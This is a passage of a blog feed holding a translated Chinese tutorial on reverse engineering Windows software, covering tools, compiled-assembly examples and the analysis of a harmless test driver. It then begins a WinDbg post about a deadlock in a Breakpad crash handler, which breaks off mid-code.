    <link href="http://www.youngroe.com/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/"/>
    <id>http://www.youngroe.com/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/</id>
    <published>2019-04-06T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.201Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>你有没有想过要拆开某个机械装置了解它的工作原理呢？嗯，谁没有呢。这种欲望也是是逆向工程的主导力量，逆向对于分析产品安全性、在不运行可疑的.exe文件的情况下查明其用途、恢复丢失的文档、开发基于旧软件的新解决方案等非常有用。<br><a id="more"></a><br>在本文中，我们讨论执行逆向工程所需的知识结构、逆向工程的基本原理、Windows软件、反汇编器和工具。我们还提供了对一个程序进行逆向工程的步骤示例。</p>
<h2 id="0x01_什么是逆向工程？">0x01 什么是逆向工程？</h2><p>逆向工程是发现硬件或软件背后的原理（例如其体系结构和内部结构）的过程。简单来说逆向工程就是搞清楚程序是如何工作的。<br>显然，如果您有文档，那么整个过程将变得更加简单。但是经常会发生这样的情况：没有文档，您需要通过另外的途径来学习某个软件的工作方式。<br>您什么时候需要对软件进行逆向工程，逆向工程对你有什么帮助？<br>逆向工程在计算机科学领域有许多用途，包括：</p>
<ul>
<li>研究网络通讯协议</li>
<li>查找恶意软件中使用的算法，例如计算机病毒，特洛伊木马，勒索软件等。</li>
<li>研究用于存储任何类型信息的文件格式，例如电子邮件数据库和磁盘映像</li>
<li>检查您自己的软件抵抗逆向工程的能力</li>
<li>改善软件与系统和第三方软件的兼容性</li>
<li>使用未文档化的系统功能<br>逆向工程的合法性取决于其目的以及软件的使用方式。假设您已合法获得该软件的副本，则上述所有目的都是完全合法的。但是，例如，如果您打算对软件某些闭源功能进行逆向工程，然后在另一个软件中使用，则可能会遇到麻烦。</li>
</ul>
<p>关于<a href="https://en.wikibooks.org/wiki/Reverse_Engineering/Legal_Aspects" target="_blank" rel="external">法律文件</a>，最终用户许可协议（EULA）通常禁止进行逆向工程。但是美国<a href="https://www.law.cornell.edu/uscode/text/17/1201" target="_blank" rel="external">数字千年版权法案</a>规定，如果为了提高与其他产品的兼容性而逆向某个软件是合法的。<br>法律要求因国家/地区而异，因此请在开始之前花点时间研究一下。<br>现在，让我们看看如何对软件进行逆向工程。</p>
<h2 id="0x01_逆向工程需要什么？">0x01 逆向工程需要什么？</h2><p>要开始逆向软件，您需要：</p>
<ul>
<li>1.您想要使用逆向工程领域的知识</li>
<li>2.一些能够再反汇编一个软件时应用你专业知识的工具<br>让我们考虑一个与软件不相关的例子。假设您有一只手表，想确定它是机械的、石英的还是自动的。<br>拥有该领域的知识意味着您应该知道有三种类型的手表。此外，您应该知道，如果有电池，它应该在手表内部，打开手表就可以看到它。您还应该了解手表的内部结构，电池的外观以及打开表壳所需的工具的基本知识。拥有可以验证知识的工具，意味着您需要一把螺丝起子或其他专用工具，才能打开手表。<br>就像对手表进行逆向工程需要特定的技能和工具一样，逆向工程软件也需要其自身在特定领域的知识和工具。</li>
</ul>
<h2 id="0x02_理论知识-软件逆向工程过程">0x02 理论知识-软件逆向工程过程</h2><p>对于不同的软件逆向工程任务，您需要不同类型的知识。当然，有一些常识可以帮助您完成大多数逆向工程任务：常见的应用程序结构，编程语言，编译器等知识。但是，如果没有特定的理论知识，就无法完成具体的逆向工程任务。</p>
<table>
<thead>
<tr>
<th style="text-align:left">逆向任务</th>
<th style="text-align:left">你需要的基础知识</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">对有网络行为的软件进行逆向工程</td>
<td style="text-align:left">进程间通信、网络的结构、连接、网络数据包等</td>
</tr>
<tr>
<td style="text-align:left">逆向加密算法</td>
<td style="text-align:left">密码学及最常使用的密码学相关算法</td>
</tr>
<tr>
<td style="text-align:left">逆向文件结构</td>
<td style="text-align:left">基本文件概念以及不同的系统或组件如何使用文件</td>
</tr>
</tbody>
</table>
<p>在逆向分析某些软件时使用一些技巧可以节省大量时间。对于有文件交互的软件，可以输入一些比较特殊的数据，然后记录实际存储时候的数据的大小和偏移，这些信息有助于你发现这些文件的内部结构。<br>进行逆向工程过程时，软件开发人员通常使用反汇编程序来查找适当的算法和程序逻辑。有许多不同的可执行文件格式，编译器（提供不同的输出）和操作系统，因为这种多样性，很难通过单一的技术去逆向各种类型的软件。<br>要理解反编译的代码，您需要一些有关汇编语言，函数调用约定，栈结构，堆栈框架等方知识。<br>了解不同语言的汇编程序输出可能有助于您发现原始功能。让我们来看一些Windows x86平台的示例。<br>假设我们有以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; count;</span><br></pre></td></tr></table></figure>
<p>如果我们将此代码编译为可执行文件，则会在反汇编程序中看到以下内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">004113</span>DE loc_4113DE:</span><br><span class="line"><span class="number">004113</span>DE     mov     eax, [ebp-<span class="number">14</span>h]</span><br><span class="line"><span class="number">004113E1</span>     add     eax, <span class="number">1</span></span><br><span class="line"><span class="number">004113E4</span>     mov     [ebp-<span class="number">14</span>h], eax</span><br><span class="line"><span class="number">004113E7</span> loc_4113E7:</span><br><span class="line"><span class="number">004113E7</span>     cmp     [ebp-<span class="number">14</span>h], <span class="number">0</span>Ah</span><br><span class="line"><span class="number">004113</span>EB     jge     <span class="keyword">short</span> loc_4113F8</span><br><span class="line"><span class="number">004113</span>ED     mov     eax, [ebp-<span class="number">8</span>]</span><br><span class="line"><span class="number">004113F</span>0     add     eax, <span class="number">1</span></span><br><span class="line"><span class="number">004113F</span>3     mov     [ebp-<span class="number">8</span>], eax</span><br><span class="line"><span class="number">004113F</span>6     jmp     <span class="keyword">short</span> loc_4113DE</span><br><span class="line"><span class="number">004113F</span>8 loc_4113F8:</span><br><span class="line"><span class="number">004113F</span>8     mov     ecx, ds:?<span class="built_in">cout</span>@<span class="built_in">std</span></span><br><span class="line"><span class="number">004113F</span>E     push    eax</span><br><span class="line"><span class="number">00411400</span>     call    ds:basic_ostream@<span class="keyword">operator</span>&lt;&lt;(<span class="keyword">int</span>)</span><br><span class="line"><span class="number">00411404</span>     xor     eax, eax</span><br><span class="line"><span class="number">00411406</span>     retn</span><br></pre></td></tr></table></figure>
<p>如上，for循环最后变成了由比较和跳转语句组成的汇编代码，注意这里的汇编代码并未使用ecx作为循环计数器，另外这里的局部变量时[ebp-14h]和[ebp-8]。<br>让我们看看使用release模式编译会汇编代码会有什么变化:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00401000</span> main     proc near</span><br><span class="line"><span class="number">00401000</span>     mov     ecx, ds:?<span class="built_in">cout</span>@<span class="built_in">std</span></span><br><span class="line"><span class="number">00401006</span>     push    <span class="number">0</span>Ah</span><br><span class="line"><span class="number">00401008</span>     call    ds:basic_ostream@<span class="keyword">operator</span>&lt;&lt;(<span class="keyword">int</span>)</span><br><span class="line"><span class="number">0040100</span>E     xor     eax, eax</span><br><span class="line"><span class="number">00401010</span>     retn</span><br><span class="line"><span class="number">00401010</span> main     endp</span><br></pre></td></tr></table></figure>
<p>这段代码看起来与之前的代码完全不同。这是因为代码被优化了。删除了该循环，因为除了将count变量增加到10之外，循环没有做任何其他事情，因此优化程序决定仅保留count变量的最终值，并将该值直接作为count输出运算符的参数。<br>目前，我们使用的编译器非常擅长优化代码。这就是为什么在进行逆向工程时，最好理解代码背后的思想（代码原理），而不是尝试获取原始代码本身。如果您了解代码背后的原理，则只需编写适合原始任务的原型即可。<br>如果您编译不同的运算符，结构和其他语言构造，那么你就知道汇编代码将非常有用。了解最终的汇编代码是开始C++逆向工程过程的一种好方法，但是我们在这里不介绍它的技术细节。</p>
<h2 id="0x03_逆向工程Windows软件的实用工具">0x03 逆向工程Windows软件的实用工具</h2><p>在我们的<a href="https://www.apriorit.com/dev-blog/173-application-architecture-research" target="_blank" rel="external">应用程序架构研究中</a>，我们已经描述了几种逆向工程工具，包括ProcessMonitor和ProcessExplorer。这些工具对于逆向工程绝对是必不可少的。<br>在本节中，我们将回顾最受欢迎的反汇编程序以及用于逆向工程项目的其他一些工具。<br>您可以在有关<a href="https://www.apriorit.com/dev-blog/366-software-reverse-engineering-tools" target="_blank" rel="external">最佳软件逆向工程工具的文章</a>中获得更多详细信息和用法示例。</p>
<h3 id="反汇编工具">反汇编工具</h3><p>反汇编程序是将可执行文件转换为汇编语言的程序。最受欢迎的是<a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="external">IDA Pro</a><br><strong>IDA Pro</strong></p>
<div align="center"><br><img src="/img/reverse_idapro.png" alt="IDA Pro" align="center"><br></div><br>IDA Pro是一种方便而强大的反汇编工具。由很多功能，可让您快速反汇编一个软件。它可以显示函数调用树，解析可执行文件的导入和导出，并显示有关它们的信息。它甚至可以用C语言显示代码。它还支持多种CPU架构，因此可以使用IDA Pro对ARM，AVR，M68k和许多其他架构进行逆向工程。<br><br><strong>Radare</strong><br><div align="center"><br><img src="/img/reverse_radare.jpg" alt="Radare" align="center"><br></div>

<p><a href="https://rada.re/r/" target="_blank" rel="external">Radare</a>反汇编工具是IDA的替代产品。它基本上具有IDA的所有功能。虽然没有那么强大和稳定。但是它是免费和开源的。Radare本身是一个控制台工具，但是它具有Cutter前端，这使其成为IDA的可选替代。</p>
<h3 id="Windows_Sysinternals">Windows Sysinternals</h3><p><a href="https://docs.microsoft.com/en-us/sysinternals/" target="_blank" rel="external">Windows Sysinternals</a>实用程序通常用于Microsoft Windows环境的管理，诊断，故障排除和监视。但它们也适用于逆向Windows软件。<br><strong>TCPView</strong>是一个网络嗅探器，它显示来自所有进程的有关TCP/UDP数据包的所有信息。该工具对于逆向网络协议很有用。<br><strong>PortMon</strong>是一个物理系统端口监视器。它监视串行和并行端口以及通过它们的所有流量。<br><strong>WinObj</strong>以分层结构显示系统中的所有全局对象。当逆向使用同步对象（例如互斥量和信号量）的应用程序以及内核模式驱动程序时，此工具很有用。</p>
<h3 id="网络监控工具">网络监控工具</h3><p><strong>Wireshark</strong></p>
<div align="center"><br><img src="/img/reverse_Wireshark.jpg" alt="Wireshark" align="center"><br></div>

<p><a href="https://www.wireshark.org/" target="_blank" rel="external">Wireshark</a>是功能最强大的网络嗅探器之一。它不仅允许您捕获网络流量，而且还包含针对各种网络协议的解析器，这些解析器从诸如以太网，TCP和IP的真正底层开始，到诸如WebSockets和XMPP的特定于应用程序的协议。</p>
<p><strong>Fiddler</strong></p>
<div align="center"><br><img src="/img/reverse_Fiddler.jpg" alt="Fiddler" align="center"><br></div><br>Fiddler是一个Web代理，它记录来自浏览器的流量，并允许您分析HTTP/HTTPS请求。与Wireshark不同，它显示HTTP会话而不是单独的网络数据包。Fiddler还允许您在监视SOAP，REST和AJAX请求时分析通过HTTP发送的压缩数据，并分析JSON和XML数据(译者注:搭配proxifier使用更强大)。<br><br><strong>API Monitor</strong><br><br><div align="center"><br><img src="/img/reverse_apimonitor.png" alt="API Monitor" align="center"><br></div>

<p><a href="http://www.rohitab.com/apimonitor" target="_blank" rel="external">API Monitor</a>是非常实用的工具，用于发现应用程序调用了哪些API以及应用程序从这些API期望的行为。该工具具有功能强大的数据库，可让您看到对不仅是kernel32和ntdll的大量API函数的调用，而且还包括对COM，托管环境等的调用。此外，API Monitor提供了方便的过滤机制。</p>
<h3 id="调试器">调试器</h3><p>对于任何开发人员来说，调试器对于查看程序现在正在做什么时无可替代的。逆向应用程序时从调试中获得的好处与调试实时应用程序时获得的好处相同。<br>最受欢迎的调试器是OllyDbg，WinDbg和Windbg Preview。</p>
<p><strong>OllyDbg</strong></p>
<div align="center"><br><img src="/img/reverse_ollydbg.png" alt="OllyDbg" align="center"><br></div><br>当涉及软件逆向工程时，OllyDbg（及其后继x64dbg）可能是最好的调试器。它是专门为满足逆向需求而开发的，并具有用于此目的的所有功能：<br><br>- 内置的反汇编程序，能够分析和识别关键数据结构<br>- 导入和导出分析功能<br>- 内置的assembling和patching引擎<br>解析API函数及其参数的能力使逆向系统的交互变得容易。堆栈视图提供了大量有关调用堆栈的信息。另一个重要的优点是，可以实用OllyDbg调试有调试保护的应用程序，而普通的调试器却无能为力。<br><br><strong>WinDbg</strong><br><div align="center"><br><img src="/img/reverse_Windbg.png" alt="Windbg" align="center"><br></div>

<p>尽管界面简单，但<a href="http://www.windbg.org/" target="_blank" rel="external">WinDbg</a>具有强大的调试工具。它具有内置的反汇编程序，各种命令，可让您几乎了解要调试的进程/系统的所有内容，并具有内核模式调试的能力，这可能是最有价值的功能。对于逆向驱动程序，尤其是内核模式驱动程序，这是一个很大的优势。</p>
<p><strong>Windbg Preview</strong></p>
<div align="center"><br><img src="/img/reverse_Windbg_Preview.jpg" alt="Windbg Preview" align="center"><br></div><br>Windbg Preview是Microsoft开发的Windbg的新版本。它仅通过Windows应用商店分发。它具有经典Windbg的所有功能以及新的UI和一些新功能。这些新功能之一是Time Travel Debugging，它使您可以记录一段程序执行时间，然后根据需要重复调试多次。这样您可以通过逐步执行代码中所关心的部分，而不必担心意外运行某些代码并丢失上下文或所有数据。<br><br>## 0x04 现实中的软件逆向工程示例<br><br>现在，我们将看到一个示例，说明如何对软件进行逆向工程。假设您有一个可疑的可执行文件。您需要了解该程序的功能以及对用户而言是否安全。考虑到这种情况，最好不要在工作计算机上运行此可执行文件，而要使用虚拟机。让我们在虚拟机中启动应用程序。<br><div align="center"><br><img src="/img/reverse_CreateService.png" alt="Process creates a service" align="center"><br></div><br>如我们所见，该文件创建一个名为TestDriver的Windows服务，为内核类型，因此我们知道它是一个驱动程序。但是从哪里获取驱动程序文件才能运行？我们可以使用Sysinternals Suite中的ProcessMonitor进行查找。打开ProcessMonitor时，我们可以设置过滤器以仅向我们显示感兴趣的文件活动。其活动日志如下所示：<br><div align="center"><br><img src="/img/reverse_filemon.png" alt="FileMon information" align="center"><br></div>

<p>驱动程序文件是由我们所要进行的逆向的程序创建的，该程序将该文件放置在用户的temp目录中。无需在temp文件夹中查找文件，因为我们发现该过程会在使用后立即将其删除。那么该文件干了什么呢？如果将文件解压缩，我们可能会尝试在流程的资源部分中找到它，因为这是存储此类数据的常用位置。让我们看看那里。我们将使用另一个工具-<a href="http://www.angusj.com/resourcehacker/" target="_blank" rel="external">Resource Hacker</a>-检查资源。运行它：</p>
<p><div align="center"><br><img src="/img/reverse_reshack.png" alt="使用Resource Hacker检查资源" align="center"><br></div><br>找到了，我们在资源文件中找到了，这可能是Windows可执行文件，因为它以MZ签名开头并且具有字符串“This program cannot be run in DOS mode”。让我们检查一下它是否是我们的驱动程序文件。为此，我们使用Resource Hacker提取资源，然后在反汇编程序中将其打开。</p>
<p><div align="center"><br><img src="/img/reverse_disdrv.png" alt align="center"><br></div><br>众所周知，DriverEntry是Windows系统中内核模式驱动程序的入口点。似乎我们找到的时一个驱动程序文件，因此我们可以继续进行研究。</p>
<h2 id="0x05_如何对驱动程序进行反向工程">0x05 如何对驱动程序进行反向工程</h2><p>要开始对驱动程序进行逆向工程，我们逐一检查从DriverEntry调用的函数。转到sub_14005，没有发现任何有趣的事情，因此我们继续进行sub_110F0并找到以下代码：</p>
<p><div align="center"><br><img src="/img/reverse_assdiver.png" alt align="center"><br></div><br>为了简单起见，此处省略了一些信息。<br>在第一个代码清单中，创建了一个unicode字符串，该字符串指向路径C:\hello.txt。之后，结构OBJECT_ATTRIBUTES填充了常规值；我们知道在调用ZwCreateFile之类的函数时通常需要此结构。<br>在第二个清单中，我们看到确实调用了ZwCreateFile，这使我们非常确定驱动程序已创建文件-并且我们知道该文件在创建之后的位置。<br>从第三和第四代码清单中可以看到，驱动程序采用unicode字符串并将其写入缓冲区（这在sub_11150函数中发生），然后将使用ZwWriteFile函数将缓冲区写入文件。最后，驱动程序使用ZwClose API关闭文件。<br>让我们总结一下。我们发现原始程序从其资源中提取了驱动程序文件，并将其放入当前用户的临时文件夹中，为此驱动程序创建Windows服务并运行它。之后，程序将停止并从temp目录中删除服务和原始驱动程序文件。从这种行为和对反汇编的分析来看，驱动程序除了在C盘中创建一个名为hello.txt的文件并写入字符串“Hello from driver”外，什么都不做。</p>
<p><div align="center"><br><img src="/img/htre-win-13.png" alt align="center"><br></div><br>精彩！我们已经对该简单程序进行了逆向工程，现在我们知道它可以安全使用。我们可以通过许多不同的方式实现此结果-使用调试或API Mon，编写测试等。您可以找到自己的方式来对适合您的软件进行逆向工程。</p>
<h2 id="0x06_结论">0x06 结论</h2><p>Windows软件逆向工程需要扎实的教育背景和编程经验。为了开始逆向工程，您需要结合汇编，网络监控，调试，API集成，多种程序语言，编译器等方面的技能。在逆转软件时还必须非常小心，以免违反版权法或损害版权及你的操作系统。</p>
<p><em>原文地址：<a href="https://www.apriorit.com/dev-blog/364-how-to-reverse-engineer-software-windows-in-a-right-way" target="_blank" rel="external">https://www.apriorit.com/dev-blog/364-how-to-reverse-engineer-software-windows-in-a-right-way</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>你有没有想过要拆开某个机械装置了解它的工作原理呢？嗯，谁没有呢。这种欲望也是是逆向工程的主导力量，逆向对于分析产品安全性、在不运行可疑的.exe文件的情况下查明其用途、恢复丢失的文档、开发基于旧软件的新解决方案等非常有用。<br>]]>
    
    </summary>
    
      <category term="Windows" scheme="http://www.youngroe.com/tags/Windows/"/>
    
      <category term="逆向" scheme="http://www.youngroe.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows平台下一个崩溃而导致的死锁分析]]></title>
    <link href="http://www.youngroe.com/2019/01/12/Windows/a_crash_lead_deadlock/"/>
    <id>http://www.youngroe.com/2019/01/12/Windows/a_crash_lead_deadlock/</id>
    <published>2019-01-12T12:13:53.000Z</published>
    <updated>2020-02-15T07:54:24.198Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_问题介绍">0x00 问题介绍</h2><p>测试反馈测试过程中发现程序进程存在但是界面没加载出来，看现场很快发现是因为版本不匹配而导致程序崩溃，在写dmp的过程中死锁而导致进程卡死，由于程序是卡死而非退出守护进程也未重启程序，最终导致界面一直没加载出来。<br>现象就如上面所说，但是为什么写dmp为什么会导致程序死锁呢？<br><a id="more"></a></p>
<h2 id="0x01_初探死锁原因">0x01 初探死锁原因</h2><p>首先我们来看下程序死锁时线程状态，分析下死锁原因：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; ~<span class="number">0</span>kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">0061</span>c8cc <span class="number">751</span>a15bf <span class="number">00000138</span> <span class="number">00000000</span> <span class="number">00000000</span> ntdll!NtWaitForSingleObject+<span class="number">0x15</span> (FPO: [<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line"><span class="number">0061</span>c938 <span class="number">770e1194</span> <span class="number">00000138</span> ffffffff <span class="number">00000000</span> KERNELBASE!WaitForSingleObjectEx+<span class="number">0x98</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>c950 <span class="number">770e1148</span> <span class="number">00000138</span> ffffffff <span class="number">00000000</span> kernel32!WaitForSingleObjectExImplementation+<span class="number">0x75</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>c964 <span class="number">6</span>c710cbb <span class="number">00000138</span> ffffffff <span class="number">6</span>c71092f kernel32!WaitForSingleObject+<span class="number">0x12</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>c978 <span class="number">6</span>c710983 <span class="number">0061</span>ca54 <span class="number">00000000</span> <span class="number">6</span>c71092f xxx!google_breakpad::ExceptionHandler::WriteMinidumpOnHandlerThread+<span class="number">0x64</span> (FPO: [<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>]) (CONV: thiscall) </span><br><span class="line"><span class="number">0061</span>c994 <span class="number">7712030</span>d <span class="number">0061</span>ca24 <span class="number">7712031f</span> <span class="number">0061</span>ca54 xxx!google_breakpad::ExceptionHandler::HandleException+<span class="number">0x54</span> (FPO: [Non-Fpo]) (CONV: thiscall) </span><br><span class="line"><span class="number">0061</span>ca24 <span class="number">77686637</span> <span class="number">0061</span>ca54 <span class="number">77686514</span> <span class="number">00000000</span> kernel32!UnhandledExceptionFilter+<span class="number">0x119</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>ca2c <span class="number">77686514</span> <span class="number">00000000</span> <span class="number">0061f</span>a04 <span class="number">7763</span>c6b0 ntdll!__RtlUserThreadStart+<span class="number">0x62</span> (FPO: [SEH])</span><br><span class="line"><span class="number">0061</span>ca40 <span class="number">776863</span>b1 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ntdll!_EH4_CallFilterFunc+<span class="number">0x12</span> (FPO: [Uses EBP] [<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>])</span><br><span class="line"><span class="number">0061</span>ca68 <span class="number">7766</span>b81d fffffffe <span class="number">0061f</span>9f4 <span class="number">0061</span>cba4 ntdll!_except_handler4+<span class="number">0x8e</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>ca8c <span class="number">7766</span>b7ef <span class="number">0061</span>cb54 <span class="number">0061f</span>9f4 <span class="number">0061</span>cba4 ntdll!ExecuteHandler2+<span class="number">0x26</span> (FPO: [Uses EBP] [<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>])</span><br><span class="line"><span class="number">0061</span>cab0 <span class="number">7766</span>b790 <span class="number">0061</span>cb54 <span class="number">0061f</span>9f4 <span class="number">0061</span>cba4 ntdll!ExecuteHandler+<span class="number">0x24</span> (FPO: [<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>])</span><br><span class="line"><span class="number">0061</span>cb3c <span class="number">77620163</span> <span class="number">0061</span>cb54 <span class="number">0061</span>cba4 <span class="number">0061</span>cb54 ntdll!RtlDispatchException+<span class="number">0x127</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>cb3c <span class="number">00000000</span> <span class="number">0061</span>cb54 <span class="number">0061</span>cba4 <span class="number">0061</span>cb54 ntdll!KiUserExceptionDispatcher+<span class="number">0xf</span> (FPO: [<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>]) (CONTEXT @ <span class="number">00000008</span>)</span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; .exr <span class="number">0061</span>cb54 </span><br><span class="line">ExceptionAddress: <span class="number">7519</span>c52f (KERNELBASE!RaiseException+<span class="number">0x00000058</span>)</span><br><span class="line">   ExceptionCode: e06d7363 (C++ EH exception)</span><br><span class="line">  ExceptionFlags: <span class="number">00000001</span></span><br><span class="line">NumberParameters: <span class="number">3</span></span><br><span class="line">   Parameter[<span class="number">0</span>]: <span class="number">19930520</span></span><br><span class="line">   Parameter[<span class="number">1</span>]: <span class="number">0061</span>d0a0</span><br><span class="line">   Parameter[<span class="number">2</span>]: <span class="number">6</span>d376990</span><br><span class="line">  pExceptionObject: <span class="number">0061</span>d0a0</span><br><span class="line">  _s_ThrowInfo    : <span class="number">6</span>d376990</span><br><span class="line">  Type            : <span class="keyword">class</span> <span class="built_in">std</span>::bad_alloc</span><br><span class="line">  Type            : <span class="keyword">class</span> <span class="built_in">std</span>::exception</span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; .cxr <span class="number">0061</span>cba4 </span><br><span class="line">eax=<span class="number">0061</span>d008 ebx=<span class="number">0061</span>d0e4 ecx=<span class="number">00000003</span> edx=<span class="number">00000000</span> esi=<span class="number">3f</span>ffffef edi=<span class="number">00000000</span></span><br><span class="line">eip=<span class="number">7519</span>c52f esp=<span class="number">0061</span>d008 ebp=<span class="number">0061</span>d058 iopl=<span class="number">0</span>         nv up ei pl nz ac po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00000212</span></span><br><span class="line">KERNELBASE!RaiseException+<span class="number">0x58</span>:</span><br><span class="line"><span class="number">7519</span>c52f c9              leave</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> Qt5Core.dll - </span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> Desktop.exe - </span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to <span class="keyword">export</span> symbols <span class="keyword">for</span> Qt5Widgets.dll - </span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; kv</span><br><span class="line">  *** Stack trace <span class="keyword">for</span> last <span class="built_in">set</span> context - .thread/.cxr resets it</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">0061</span>d058 <span class="number">6f</span>e4872d e06d7363 <span class="number">00000001</span> <span class="number">00000003</span> KERNELBASE!RaiseException+<span class="number">0x58</span> (FPO: [Non-Fpo])</span><br><span class="line"><span class="number">0061</span>d090 <span class="number">6</span>d0a6956 <span class="number">0061</span>d0a0 <span class="number">6</span>d376990 <span class="number">6</span>d2516d4 msvcr100!_CxxThrowException+<span class="number">0x48</span> (FPO: [Non-Fpo])</span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line"><span class="number">0061</span>d0ac <span class="number">6</span>d0b888b <span class="number">07</span>cb37f8 <span class="number">07</span>cb37f8 <span class="number">00000000</span> Qt5Core!qBadAlloc+<span class="number">0x1c</span></span><br><span class="line"><span class="number">0061</span>d0f4 <span class="number">00285f</span>be <span class="number">0061</span>d11c <span class="number">3f</span>ffffef <span class="number">00000000</span> Qt5Core!QByteArray::resize+<span class="number">0x96</span></span><br><span class="line"><span class="number">0</span>:<span class="number">065</span>&gt; !handle <span class="number">0x138</span> <span class="number">0xf</span></span><br><span class="line">Handle <span class="number">00000138</span></span><br><span class="line">  Type         	Semaphore</span><br><span class="line">  Attributes   	<span class="number">0</span></span><br><span class="line">  GrantedAccess	<span class="number">0x1f0003</span>:</span><br><span class="line">         Delete,ReadControl,WriteDac,WriteOwner,Synch</span><br><span class="line">         QueryState,ModifyState</span><br><span class="line">  HandleCount  	<span class="number">2</span></span><br><span class="line">  PointerCount 	<span class="number">4</span></span><br><span class="line">  Name         	&lt;none&gt;</span><br><span class="line">  No object specific information available</span><br></pre></td></tr></table></figure></p>
<p>首先看下主线程，主线程因为bad_alloc主动触发异常被breakpad捕获到在创建dmp文件，并通过WaitForsingleObject等待句柄值为0x138的信号量释放。这里可以回到breakpad的源码，可以发现breakpad中是通过信号量控制ExceptionHandlerThreadMain线程生成dmp，此刻是通过WaitForSingleObject等待ExceptionHandlerThreadMain线程完成dmp生成。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This causes the handler thread to call WriteMinidumpWithException.</span></span><br><span class="line">ReleaseSemaphore(handler_start_semaphore_, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until WriteMinidumpWithException is done and collect its return 